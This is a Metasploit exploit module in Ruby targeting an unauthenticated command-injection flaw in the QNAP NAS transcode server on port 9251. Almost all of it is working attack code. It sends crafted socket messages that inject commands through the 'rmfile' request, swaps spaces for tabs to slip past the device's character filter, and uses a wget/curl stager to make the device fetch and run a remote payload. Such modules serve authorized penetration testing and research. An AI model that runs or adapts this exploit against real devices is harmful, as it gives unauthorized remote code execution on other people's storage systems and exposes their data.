# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;QNAP Transcode Server Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated remote command injection
        vulnerability in QNAP NAS devices. The transcoding server listens
        on port 9251 by default and is vulnerable to command injection
        using the &#039;rmfile&#039; command.

        This module was tested successfully on a QNAP TS-431 with
        firmware version 4.3.3.0262 (20170727).
      },
      &#039;Author&#039;     =>
        [
          &#039;Zenofex&#039;, # Initial vulnerability discovery and PoC
          &#039;0x00string&#039;, # Initial vulnerability discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Platform&#039;   => &#039;linux&#039;,
      &#039;References&#039; =>
        [
          [ &#039;URL&#039;, &#039;https://www.exploitee.rs/index.php/QNAP_TS-131&#039; ],
          [ &#039;URL&#039;, &#039;http://docs.qnap.com/nas/4.1/Home/en/index.html?transcode_management.htm&#039; ]
        ],
      &#039;DisclosureDate&#039;  => &#039;Aug 6 2017&#039;,
      &#039;Privileged&#039;      => true,
      &#039;Arch&#039;            => ARCH_ARMLE,
      &#039;DefaultOptions&#039;  =>
        {
        },
      &#039;Targets&#039;         => [[&#039;Automatic&#039;, {}]],
      &#039;CmdStagerFlavor&#039; => %w{wget curl},
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        Opt::RPORT(9251),
        OptInt.new(&#039;DELAY&#039;, [true, &#039;How long to wait for the device to download the payload&#039;, 30])
      ])
    deregister_options &#039;cmdstager::decoder&#039;
  end

  def check
    vprint_status &#039;Connecting to transcode server...&#039;

    connect
    sock.put "\x01\x00\x00\x00"
    res = sock.get_once

    if res.blank?
      vprint_status &#039;No reply from server&#039;
      return CheckCode::Safe
    end

    vprint_status "Received response: #{res}"

    return CheckCode::Detected if res.to_s =~ /client&#039;s request is accepted/

    CheckCode::Safe
  rescue ::Rex::ConnectionError
    vprint_error &#039;Connection failed&#039;
    return CheckCode::Unknown
  ensure
    disconnect
  end

  def execute_command(cmd, opts)
    # Filtered characters: 0x20 ! $ & 0x39 , ; = [ ] ^ ` { } %
    # Execute each command seperately
    cmd.split(&#039;;&#039;).each do |c|
      connect
      vprint_status "Executing command: #{c}"

      # Replace spaces with tabs
      c.tr! &#039; &#039;, "\t"

      sock.put "\x01\x00\x00\x00/|#{c}|\x00"
      res = sock.get_once

      unless res.to_s =~ /client&#039;s request is accepted/
        print_status &#039;Unexpected reply&#039;
        break
      end

      print_status "Sent command successfully (#{c.length} bytes)"

      disconnect

      if c =~ /^(curl|wget)/
        print_status "Waiting for the device to download the payload (#{datastore[&#039;DELAY&#039;]} seconds)..."
        Rex.sleep datastore[&#039;DELAY&#039;]
      end
    end
  rescue ::Rex::ConnectionError
    fail_with Failure::Unreachable, &#039;Failed to connect to the transcode server&#039;
  ensure
    disconnect
  end

  def exploit
    vprint_status &#039;Connecting to transcode server...&#039;
    execute_cmdstager linemax: 400
  end
end

